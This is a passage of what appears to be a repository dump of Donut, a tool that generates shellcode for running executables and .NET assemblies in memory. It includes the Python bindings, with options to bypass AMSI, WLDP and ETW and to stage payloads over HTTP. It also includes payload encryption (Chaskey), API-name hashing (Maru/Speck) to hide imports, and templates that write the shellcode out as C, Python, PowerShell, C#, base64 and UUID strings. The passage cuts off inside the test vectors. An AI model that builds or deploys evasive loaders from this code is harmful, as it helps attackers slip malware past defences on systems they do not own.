          "content": "/**\n  BSD 3-Clause License\n\n  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.\n\n  Python C Extension by @byt3bl33d3r\n\n  Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions are met:\n\n  * Redistributions of source code must retain the above copyright notice, this\n    list of conditions and the following disclaimer.\n\n  * Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n  * Neither the name of the copyright holder nor the names of its\n    contributors may be used to endorse or promote products derived from\n    this software without specific prior written permission.\n\n  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#define PY_SSIZE_T_CLEAN\n#include <Python.h>\n#include \"donut.h\"\n\nstatic PyObject *Donut_Create(PyObject *self, PyObject *args, PyObject *keywds) {\n    char *input = NULL;       // input file to execute in-memory\n    \n    int arch      = 0;     // target CPU architecture or mode\n    int bypass    = 0;     // AMSI/WDLP/ETW bypassing behavior\n    int headers   = 0;     // Preserve PE headers behavior\n    int compress  = 0;     // compress input file\n    int entropy   = 0;     // whether to randomize API hashes and use encryption\n    int format    = 0;     // output format\n    int exit_opt  = 0;     // exit process or exit thread\n    int thread    = 0;     // run unmanaged entrypoint as a thread\n    char *oep     = NULL;  // creates new thread for loader and continues execution at specified address provided in hexadecimal format\n    \n    char *output  = NULL;     // name of loader stored on disk\n    \n    char *runtime = NULL;     // runtime version\n    char *domain  = NULL;     // app domain name to use\n    char *cls     = NULL;     // class name \n    char *method  = NULL;     // method name\n    \n    char *params  = NULL;     // parameters for method\n    int  unicode  = 0;        // param is converted to unicode before being passed to unmanaged DLL function\n\n    char *decoy   = NULL;     // path of decoy module\n    \n    char *server  = NULL;     // HTTP server to download module from\n    char *modname = NULL;     // name of module stored on HTTP server\n    \n    static char *kwlist[] = {\n      \"file\", \"arch\", \"bypass\", \"headers\", \"compress\", \"entropy\", \n      \"format\", \"exit_opt\", \"thread\", \"oep\", \"output\", \n      \"runtime\", \"appdomain\", \"cls\", \"method\", \"params\", \n      \"unicode\", \"decoy\", \"server\", \"url\", \"modname\", NULL};\n      \n    if (!PyArg_ParseTupleAndKeywords(\n      args, keywds, \"s|iiiiiiiisssssssissss\", kwlist, &input, &arch, \n      &bypass, &headers, &compress, &entropy, &format, &exit_opt, &thread, \n      &oep, &output, &runtime, &domain, &cls, &method, &params, &unicode,\n      &decoy, &server, &server, &modname)) \n    {\n        return NULL;\n    }\n\n    DONUT_CONFIG c;\n\n    // zero initialize configuration\n    memset(&c, 0, sizeof(c));\n    \n    // default settings\n    c.inst_type = DONUT_INSTANCE_EMBED;    // file is embedded\n    c.arch      = DONUT_ARCH_X84;          // dual-mode (x86+amd64)\n    c.bypass    = DONUT_BYPASS_CONTINUE;   // continues loading even if disabling AMSI/WLDP/ETW fails\n    c.headers   = DONUT_HEADERS_OVERWRITE;// overwrite PE header\n    c.format    = DONUT_FORMAT_BINARY;     // default output format\n    c.compress  = DONUT_COMPRESS_NONE;     // compression is disabled by default\n    c.entropy   = DONUT_ENTROPY_DEFAULT;   // enable random names + symmetric encryption by default\n    c.exit_opt  = DONUT_OPT_EXIT_THREAD;   // default behaviour is to exit the thread\n    c.unicode   = 0;                       // command line will not be converted to unicode for unmanaged DLL function\n\n    // input file\n    if(input != NULL) {\n      strncpy(c.input, input, DONUT_MAX_NAME - 1);\n    }\n    \n    // target cpu architecture\n    if(arch != 0) {\n      c.arch = arch;\n    }\n    // bypass options\n    if(bypass != 0) {\n      c.bypass = bypass;\n    }\n    // headers options\n    if(headers != 0) {\n      c.headers = headers;\n    }\n    // class of .NET assembly\n    if(cls != NULL) {\n      strncpy(c.cls, cls, DONUT_MAX_NAME - 1);\n    }\n    // name of domain to use for .NET assembly\n    if(domain != NULL) {\n      strncpy(c.domain, domain, DONUT_MAX_NAME - 1);\n    }\n    // encryption options\n    if(entropy != 0) {\n      c.entropy = entropy;\n    }\n    // output format\n    if(format != 0) {\n      c.format = format;\n    }\n    // method of .NET assembly\n    if(method != NULL) {\n      strncpy(c.method, method, DONUT_MAX_NAME - 1);\n    }\n    // module name\n    if(modname != NULL) {\n      strncpy(c.modname, modname, DONUT_MAX_NAME - 1);\n    }\n    // output file for loader\n    if(output != NULL) {\n      strncpy(c.output, output, DONUT_MAX_NAME - 1);\n    }\n    // parameters to method, DLL function or command line for unmanaged EXE\n    if(params != NULL) {\n      strncpy(c.args, params, DONUT_MAX_NAME - 1);\n    }\n    // path of decoy file\n    if(decoy != NULL) {\n      strncpy(c.decoy, decoy, 2048);\n    }\n    // runtime version to use for .NET DLL / EXE\n    if(runtime != NULL) {\n      strncpy(c.runtime, runtime, DONUT_MAX_NAME - 1);\n    }\n    // run entrypoint of unmanaged EXE as a thread\n    if(thread != 0) {\n      c.thread = 1;\n    }\n    // server\n    if(server != NULL) {\n      strncpy(c.server, server, DONUT_MAX_NAME - 2);\n      c.inst_type = DONUT_INSTANCE_HTTP;\n    }\n    // convert param to unicode? only applies to unmanaged DLL function\n    if(unicode != 0) {\n      c.unicode = 1;\n    }\n    // call RtlExitUserProcess to terminate host process\n    if(exit_opt != 0) {\n      c.exit_opt = exit_opt;\n    }\n    // fork a new thread and execute address of original entry point\n    if(oep != NULL) {\n      c.oep = strtoul(oep, NULL, 16);\n    }\n    // pack/compress input file\n    if(compress != 0) {\n      c.compress = compress;\n    }\n\n    int err = DonutCreate(&c);\n\n    if(err != 0) {\n        PyErr_SetString(PyExc_RuntimeError, DonutError(err));\n        DonutDelete(&c);\n        return NULL;\n    }\n\n    PyObject *shellcode = Py_BuildValue(\"y#\", c.pic, c.pic_len);\n\n    DonutDelete(&c);\n\n    return shellcode;\n}\n\n// module's function table\nstatic PyMethodDef Donut_FunctionsTable[] = {\n    {\n        \"create\", // name exposed to Python\n        // Note that this struct member _must_ be of type PyCFunction,\n        // even if (as in this case) it is secretly of type\n        // PyCFunctionWithKeywords.  This is the reason for the cast;\n        // gcc errors out without it.\n        //\n        // This is all specified in the description of the ml_meth\n        // struct member in this piece of the Python documentation:\n        // https://docs.python.org/3.12/c-api/structures.html#c.PyMethodDef\n        (PyCFunction) Donut_Create, // C wrapper function\n        METH_VARARGS|METH_KEYWORDS,\n        \"Calls DonutCreate to generate shellcode for a .NET assembly\" // documentation\n    }, \n    \n    {NULL, NULL, 0, NULL}\n};\n\n// modules definition\nstatic struct PyModuleDef Donut_Module = {\n    PyModuleDef_HEAD_INIT,\n    \"donut\",     // name of module exposed to Python\n    \"Donut Python C extension\", // module documentation\n    -1,\n    Donut_FunctionsTable\n};\n\nPyMODINIT_FUNC PyInit_donut(void) {\n    return PyModule_Create(&Donut_Module);\n}\n"
        },
        {
          "name": "encrypt.c",
          "type": "blob",
          "size": 5.3623046875,
          "content": "/**\n  BSD 3-Clause License\n\n  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.\n\n  Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions are met:\n\n  * Redistributions of source code must retain the above copyright notice, this\n    list of conditions and the following disclaimer.\n\n  * Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n  * Neither the name of the copyright holder nor the names of its\n    contributors may be used to endorse or promote products derived from\n    this software without specific prior written permission.\n\n  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#include \"encrypt.h\"\n\n#include <stdio.h>\n#include <string.h>\n\nstatic void chaskey(void *mk, void *p) {\n    uint32_t i,*w=p,*k=mk;\n\n    // add 128-bit master key\n    for(i=0;i<4;i++) w[i]^=k[i];\n    \n    // apply 16 rounds of permutation\n    for(i=0;i<16;i++) {\n      w[0] += w[1],\n      w[1]  = ROTR32(w[1], 27) ^ w[0],\n      w[2] += w[3],\n      w[3]  = ROTR32(w[3], 24) ^ w[2],\n      w[2] += w[1],\n      w[0]  = ROTR32(w[0], 16) + w[3],\n      w[3]  = ROTR32(w[3], 19) ^ w[0],\n      w[1]  = ROTR32(w[1], 25) ^ w[2],\n      w[2]  = ROTR32(w[2], 16);\n    }\n    // add 128-bit master key\n    for(i=0;i<4;i++) w[i]^=k[i];\n}\n\n// encrypt/decrypt data in counter mode\nvoid donut_encrypt(void *mk, void *ctr, void *data, uint32_t len) {\n    uint8_t  x[CIPHER_BLK_LEN], \n             *p=(uint8_t*)data,\n             *c=(uint8_t*)ctr;\n    uint32_t      i, r;\n    \n    while(len) {\n      // copy counter+nonce to local buffer\n      for(i=0;i<CIPHER_BLK_LEN;i++) \n        x[i] = c[i];\n      \n      // donut_encrypt x\n      ENCRYPT(mk, &x);\n      \n      // XOR plaintext with ciphertext\n      r = len > CIPHER_BLK_LEN ? CIPHER_BLK_LEN : len;\n      \n      for(i=0;i<r;i++) \n        p[i] ^= x[i];\n      \n      // update length + position\n      len -= r; p += r;\n      \n      // update counter\n      for(i=CIPHER_BLK_LEN;(int)i>0;i--)\n        if(++c[i-1]) break;\n    }\n}\n\n#ifdef TEST\n\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <inttypes.h>\n#include <fcntl.h>\n\n#if defined(_WIN32) || defined(_WIN64)\n#define WINDOWS\n#include <windows.h>\n#pragma comment(lib, \"advapi32.lib\")\n#else\n#include <unistd.h>\n#endif\n\nvoid bin2hex(const char *str, void *bin, int len) {\n    int i;\n    uint8_t *p = (uint8_t*)bin;\n    \n    printf(\"%s[%i] = { \", str, len);\n    \n    for(i=0;i<len;i++) {\n      printf(\"0x%02x\", p[i]);\n      if((i+1) != len) putchar(',');\n    }\n    printf(\" };\\n\");\n}\n\n// generate test vector\nvoid gen_crypto_tv(void *mk, void *ctr) {\n    uint8_t key[16], data[77], tmp[16];\n    int     i, j;\n    \n    memset(data, 0, sizeof(data));\n    memcpy(key, mk, 16);\n    memcpy(tmp, ctr, 16);\n    \n    for(i=0; i<128; i++) {\n      donut_encrypt(key, tmp, data, sizeof(data));\n      // update key with first 16 bytes of ciphertext\n      for(j=0; j<16; j++) key[j] ^= data[j];\n    }\n    bin2hex(\"donut_crypt_tv\", data, 16);\n}\n\n// 128-bit master key\nuint8_t key_tv[16] =\n{ 0x56, 0x09, 0xe9, 0x68, 0x5f, 0x58, 0xe3, 0x29,\n  0x40, 0xec, 0xec, 0x98, 0xc5, 0x22, 0x98, 0x2f };\n  \n// 128-bit plain text\nuint8_t plain_tv[16]=\n{ 0xb8, 0x23, 0x28, 0x26, 0xfd, 0x5e, 0x40, 0x5e,\n  0x69, 0xa3, 0x01, 0xa9, 0x78, 0xea, 0x7a, 0xd8 };\n  \n// 128-bit cipher text\nuint8_t cipher_tv[16] =\n{ 0xd5, 0x60, 0x8d, 0x4d, 0xa2, 0xbf, 0x34, 0x7b,\n  0xab, 0xf8, 0x77, 0x2f, 0xdf, 0xed, 0xde, 0x07 };\n\n// 128-bit counter\nuint8_t ctr_tv[16] =\n{ 0xd0, 0x01, 0x36, 0x9b, 0xef, 0x6a, 0xa1, 0x05,\n  0x1d, 0x2d, 0x21, 0x98, 0x19, 0x8d, 0x88, 0x93 };\n\n// 128-bit ciphertext for testing donut_encrypt\nuint8_t donut_crypt_tv[16] = \n{ 0xd0, 0x01, 0x36, 0x9b, 0xef, 0x6a, 0xa1, 0x05, \n  0x1d, 0x2d, 0x21, 0x98, 0x19, 0x8d, 0x8b, 0x13 };\n\nint crypto_test(void) {\n    uint8_t key[16], data[77], tmp[16];\n    int     i, j;\n    \n    memset(data, 0, sizeof(data));\n    memcpy(key, key_tv, 16);\n    memcpy(tmp, ctr_tv, 16);\n    \n    for(i=0; i<128; i++) {\n      // encrypt data\n      donut_encrypt(key, tmp, data, sizeof(data));\n      // update key with first 16 bytes of ciphertext\n      for(j=0; j<16; j++) key[j] ^= data[j];\n    }\n    return (memcmp(tmp, donut_crypt_tv, 16) == 0);\n}\n\nint main(void) {\n    uint8_t tmp1[16];\n    int     equ;\n\n    // Chaskey test\n    memcpy(tmp1, plain_tv, 16);\n    chaskey(key_tv, tmp1);\n    equ = (memcmp(tmp1, cipher_tv, 16)==0);\n    printf(\"Chaskey test : %s\\n\", equ ? \"OK\" : \"FAILED\");\n    printf(\"Donut Encrypt test : %s\\n\", crypto_test() ? \"OK\" : \"FAILED\");\n    return 0;\n}\n\n#endif\n\n"
        },
        {
          "name": "examples",
          "type": "tree",
          "content": null
        },
        {
          "name": "format.c",
          "type": "blob",
          "size": 7.5107421875,
          "content": "/**\n  BSD 3-Clause License\n\n  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.\n\n  Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions are met:\n\n  * Redistributions of source code must retain the above copyright notice, this\n    list of conditions and the following disclaimer.\n\n  * Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n  * Neither the name of the copyright holder nor the names of its\n    contributors may be used to endorse or promote products derived from\n    this software without specific prior written permission.\n\n  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#include \"format.h\"\n\n#include <stdlib.h>\n#include <inttypes.h>\n\n#include \"errors.h\"\n\n// Add DPRINT macro from donut.h since it is needed but all of donut.h cannot be included\n#if defined(DEBUG)\n #define DPRINT(...) { \\\n   fprintf(stderr, \"DEBUG: %s:%d:%s(): \", __FILE__, __LINE__, __FUNCTION__); \\\n   fprintf(stderr, __VA_ARGS__); \\\n   fprintf(stderr, \"\\n\"); \\\n }\n#else\n #define DPRINT(...) // Don't do anything in release builds\n#endif\n\n\n/**\n  Encoding: base64\n  Author  : Odzhan\n  \n  Encoding: c, python, ruby, c#, powershell and hex\n  Author  : BITAM Salim https://github.com/soolidsnake\n*/\n\n// calculate length of buffer required for base64 encoding\n#define B64_LEN(N) (((4 * (N / 3)) + 4) & -4)\n\nstatic const char b64_tbl[] =\n  \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n  \n// Compact implementation of base64 encoding.\n// The main encoding loop is inspired by Qkumba AKA Peter Ferrie.\n// This uses a lookup table and accounts for unaligned input.\n//\n// odzhan\n//\nstatic int b64_encode(\n  const void *src, uint32_t inlen, \n  void *dst, uint32_t *outlen) \n{\n    uint32_t i, len, x;\n    uint8_t  *in = (uint8_t*)src, *out = (uint8_t*)dst;\n    \n    // check arguments\n    if(outlen == NULL) return 0;\n    \n    // calculate length of buffer required for encoded string\n    len = B64_LEN(inlen);\n    \n    // return the length?\n    if(out == NULL) {\n      *outlen = len;\n      return 1;\n    }\n    \n    // can buffer contain string?\n    if(len > *outlen) return 0;\n    \n    // main encoding loop\n    while(inlen != 0) {\n      // load 3 bytes or whatever remains\n      for(x=i=0; i<3; i++) {\n        // add byte from input or zero\n        x |= ((i < inlen) ? *in++ : 0); \n        x <<= 8;\n      }\n      // increase by 1\n      inlen++;\n      // encode 3 bytes\n      for(i=4; inlen && i>0; i--) {\n        x = ROTL32(x, 6);\n        *out++ = b64_tbl[x % 64];\n        --inlen;\n      }\n    }\n    // if required, add padding\n    while(i!=0) { *out++ = '='; i--; }\n    // add null terminator\n    *out = 0;\n    // calculate output length by subtracting 2 pointers\n    *outlen = (uint32_t)(out - (uint8_t*)dst);\n    return 1;\n}\n\nint base64_template(void *pic, uint32_t pic_len, FILE *fd) {\n    uint32_t outlen;\n    void     *base64;\n    \n    DPRINT(\"Calculating length of base64 encoding\");\n    if(b64_encode(NULL, pic_len, NULL, &outlen)) {\n      DPRINT(\"Required length is %\"PRId32, outlen);\n      base64 = calloc(1, outlen + 1);\n      if(base64 == NULL) {\n        return DONUT_ERROR_NO_MEMORY;\n      }\n      DPRINT(\"Encoding shellcode\");\n      if(b64_encode(pic, pic_len, base64, &outlen)) {\n        DPRINT(\"Writing %\"PRId32 \" bytes to file\", outlen);\n        fwrite(base64, 1, outlen, fd);\n      }\n    }\n    // if on windows, copy base64 string to clipboard\n    #if defined(WINDOWS)\n      LPTSTR  strCopy;\n      HGLOBAL hCopy;\n      \n      DPRINT(\"Opening clipboard\");\n      if(OpenClipboard(NULL)) {\n        DPRINT(\"Empying contents\");\n        EmptyClipboard();\n        \n        DPRINT(\"Allocating memory\");\n        hCopy = GlobalAlloc(GMEM_MOVEABLE, outlen);\n        if(hCopy != NULL) {\n          strCopy = GlobalLock(hCopy);\n          // copy base64 string to memory\n          CopyMemory(strCopy, base64, outlen);\n          GlobalLock(hCopy);\n          DPRINT(\"Setting clipboard data\");\n          // copy to clipboard\n          SetClipboardData(CF_TEXT, hCopy);\n          GlobalFree(hCopy);\n        }\n        CloseClipboard();              \n      }\n    #endif\n    DPRINT(\"Freeing memory\");\n    free(base64);\n    return DONUT_ERROR_OK;\n}\n\nint c_ruby_template(void * pic, uint32_t pic_len, FILE* fd){\n    uint32_t j;\n    uint8_t *p = (uint8_t*)pic;\n    \n    fprintf(fd, \"unsigned char buf[] = \\n\");\n    \n    for(j=0; j < pic_len; j++) {\n      if(j % 16 == 0) fputc('\\\"', fd);\n      \n      fprintf(fd, \"\\\\x%02x\", p[j]);\n\n      if(j % 16 == 15 && j+1 < pic_len){\n        fprintf(fd, \"\\\"\\n\");\n      }\n    }\n    fprintf(fd, \"\\\";\\n\");\n    \n    return DONUT_ERROR_OK;\n}\n\nint py_template(void * pic, uint32_t pic_len, FILE* fd){\n    uint32_t j;\n    uint8_t *p = (uint8_t*)pic;\n\n    fprintf(fd, \"buf   = \\\"\\\"\\n\");\n\n    for(j=0; j < pic_len; j++){\n      if(j % 16 == 0) {\n        fprintf(fd, \"buff += \\\"\");\n      }\n      fprintf(fd, \"\\\\x%02x\", p[j]);\n\n      if(j % 16 == 15) {\n        fprintf(fd, \"\\\"\\n\");\n      }\n    }\n    if(j % 16 != 0) {\n      fputc('\\\"', fd);\n    }\n    return DONUT_ERROR_OK;\n}\n\nint powershell_template(void * pic, uint32_t pic_len, FILE* fd){\n    uint32_t j;\n    uint8_t *p = (uint8_t*)pic;\n    \n    fprintf(fd, \"[Byte[]] $buf = \");\n\n    for(j=0; j < pic_len; j++){\n      fprintf(fd, \"0x%02x\", p[j]);\n      if(j < pic_len-1) fputc(',', fd);\n    }\n    return DONUT_ERROR_OK;\n}\n\nint csharp_template(void * pic, uint32_t pic_len, FILE* fd){\n    uint32_t j;\n    uint8_t *p = (uint8_t*)pic;\n\n    fprintf(fd, \"byte[] my_buf = new byte[%\" PRId32\"] {\\n\", pic_len);\n\n    for(j=0; j < pic_len; j++){\n      fprintf(fd, \"0x%02x\", p[j]);\n      if(j < pic_len-1) fputc(',', fd);\n    }\n    fprintf(fd, \"};\");\n    \n    return DONUT_ERROR_OK;\n}\n\nint hex_template(void * pic, uint32_t pic_len, FILE* fd){\n    uint32_t j;\n    uint8_t *p = (uint8_t*)pic;\n    \n    for(j=0; j < pic_len; j++){\n      fprintf(fd, \"\\\\x%02x\", p[j]);\n    }\n    return DONUT_ERROR_OK;\n}\n\nstatic int uuid_null[16] = { 0 };\n\nint uuid_template(void * pic, uint32_t pic_len, FILE* fd){\n    uint32_t rem;\n    uint32_t j;\n    uint32_t base;\n    uint8_t *p = (uint8_t*)pic;\n    uint32_t len = pic_len;\n\n    //Ensure there are enough bytes\n    rem = len % 16;\n    if(rem != 0){\n        pic = realloc(pic, len+rem);\n        memcpy(p + len, uuid_null, rem);\n        len+=rem;\n    }\n\n    for(j=0; j < len/16; j++){\n        base = j*16;\n        fprintf(fd, \"%02x%02x%02x%02x-\", p[base+3], p[base+2], p[base+1], p[base]);\n        fprintf(fd, \"%02x%02x-\", p[base+5], p[base+4]);\n        fprintf(fd, \"%02x%02x-\", p[base+7], p[base+6]);\n        fprintf(fd, \"%02x%02x-\", p[base+8], p[base+9]);\n        fprintf(fd, \"%02x%02x%02x%02x%02x%02x\\n\", p[base+10], p[base+11], p[base+12], p[base+13], p[base+14], p[base+15]);\n    }\n    return DONUT_ERROR_OK;\n}\n"
        },
        {
          "name": "generators",
          "type": "tree",
          "content": null
        },
        {
          "name": "hash.c",
          "type": "blob",
          "size": 10.59765625,
          "content": "/**\n  BSD 3-Clause License\n\n  Copyright (c) 2017 Odzhan. All rights reserved.\n\n  Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions are met:\n\n  * Redistributions of source code must retain the above copyright notice, this\n    list of conditions and the following disclaimer.\n\n  * Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n  * Neither the name of the copyright holder nor the names of its\n    contributors may be used to endorse or promote products derived from\n    this software without specific prior written permission.\n\n  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#include \"hash.h\"\n\n// SPECK-64/128\nstatic uint64_t speck(void *mk, uint64_t p) {\n    uint32_t k[4], i, t;\n    union {\n      uint32_t w[2];\n      uint64_t q;\n    } x;\n    \n    // copy 64-bit plaintext to local buffer\n    x.q = p;\n    \n    // copy 128-bit master key to local buffer\n    for(i=0;i<4;i++) k[i]=((uint32_t*)mk)[i];\n    \n    for(i=0;i<27;i++) {\n      // encrypt 64-bit plaintext\n      x.w[0] = (ROTR32(x.w[0], 8) + x.w[1]) ^ k[0];\n      x.w[1] =  ROTR32(x.w[1],29) ^ x.w[0];\n      \n      // create next 32-bit subkey\n      t = k[3];\n      k[3] = (ROTR32(k[1], 8) + k[0]) ^ i;\n      k[0] =  ROTR32(k[0],29) ^ k[3];\n      \n      k[1] = k[2]; \n      k[2] = t;\n    }\n    // return 64-bit ciphertext\n    return x.q;\n}\n\nuint64_t maru(const void *input, uint64_t iv) {\n    uint64_t h;\n    uint32_t len, idx, end;\n    const char *api = (const char*)input;\n    \n    union {\n      uint8_t  b[MARU_BLK_LEN];\n      uint32_t w[MARU_BLK_LEN/4];\n    } m;\n    \n    // set H to initial value\n    h = iv;\n    \n    for(idx=0, len=0, end=0;!end;) {\n      // end of string or max len?\n      if(api[len] == 0 || len == MARU_MAX_STR) {\n        // zero remainder of M\n        Memset(&m.b[idx], 0, MARU_BLK_LEN - idx);\n        // store the end bit\n        m.b[idx] = 0x80;\n        // have we space in M for api length?\n        if(idx >= MARU_BLK_LEN - 4) {\n          // no, update H with E\n          h ^= MARU_CRYPT(&m, h);\n          // zero M\n          Memset(&m, 0, MARU_BLK_LEN);\n        }\n        // store total length in bits\n        m.w[(MARU_BLK_LEN/4)-1] = (len * 8);\n        idx = MARU_BLK_LEN;\n        end++;\n      } else {    \n        // store character from api string\n        m.b[idx] = (uint8_t)api[len]; \n        idx++; len++;\n      }\n      if(idx == MARU_BLK_LEN) {\n        // update H with E\n        h ^= MARU_CRYPT(&m, h);\n        // reset idx\n        idx = 0;\n      }\n    }  \n    return h;\n}\n\n#ifdef TEST\n\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <inttypes.h>\n#include <fcntl.h>\n\n#if defined(_WIN32) || defined(_WIN64)\n#define WINDOWS\n#include <windows.h>\n#pragma comment(lib, \"advapi32.lib\")\n#else\n#include <unistd.h>\n#endif\n\n// ******************************\n// test vectors for SPECK-64/128\n//\n// 128-bit key\nuint8_t key64[16]=\n{ 0x00, 0x01, 0x02, 0x03,\n  0x08, 0x09, 0x0a, 0x0b,\n  0x10, 0x11, 0x12, 0x13,\n  0x18, 0x19, 0x1a, 0x1b };\n  \n// 64-bit plain text\nuint8_t plain64[8]=\n{ 0x74, 0x65, 0x72, 0x3b,\n  0x2d, 0x43, 0x75, 0x74 };\n\n// 64-bit cipher text  \nuint8_t cipher64[8]=\n{ 0x48, 0xa5, 0x6f, 0x8c, \n  0x8b, 0x02, 0x4e, 0x45 };\n \n// 64-bit type\ntypedef union _w64_t {\n  uint8_t  b[8];\n  uint32_t w[2];\n  uint64_t q;\n} w64;\n\n// ******************************\n// test vectors for Maru hash\n//\ntypedef struct _maru_tv_t {\n    const char *str;\n    uint64_t    hash;\n} maru_tv_t;\n\nmaru_tv_t maru_tv[MARU_MAX_STR] = {\n{\"\", 0x8E63EC0D29F27D07},\n{\"C\", 0x19C7DC40E602AC8E},\n{\"73\", 0x5197B6ACC87EF423},\n{\"NY4\", 0x3BC2F21615A953C5},\n{\"X9TM\", 0xC9EC6B72BF5273D6},\n{\"H339P\", 0x6B60077EF084C1E2},\n{\"TMCT3N\", 0x33374AA7206F00FC},\n{\"RF4M66W\", 0xF7B91D9C42A886C5},\n{\"XTCX43NN\", 0x615D4FB7A2246376},\n{\"C6XCYXF9F\", 0x80D4B6324A24CEB6},\n{\"RR3TN69H9M\", 0xE6369CFF4F98B4F8},\n{\"F9C9YNTMYYR\", 0xF173A1158A4D80A9},\n{\"FPW779364RYH\", 0x517A4E86DF00BB97},\n{\"WHN4N9CT7YF7C\", 0xFCBA9541CD7765A5},\n{\"633H6CTRC64FWR\", 0x79EEC9CC663EDDC1},\n{\"WPNX66993HPWNYX\", 0x139CFA0D49AF17DC},\n{\"H66C3Y9F677WP96N\", 0xEFF27A644D53171A},\n{\"TY3YX7N3FPN7YNWT4\", 0x5361C6DBF89D0B47},\n{\"YF496N7XH4HYHRN6WM\", 0x71451CE666D8E9A4},\n{\"TWP4M739RYTCTFMMCC7\", 0xC17E5C46E2BEAD},\n{\"4FHNWP4MR9TT9Y6HYWCX\", 0x1E40C5A64B8ECE85},\n{\"TCMHT3TF7T4TRCWCF6RPF\", 0xD02290F438AA84A9},\n{\"4WW63CTHPR36MN7P3WXTHT\", 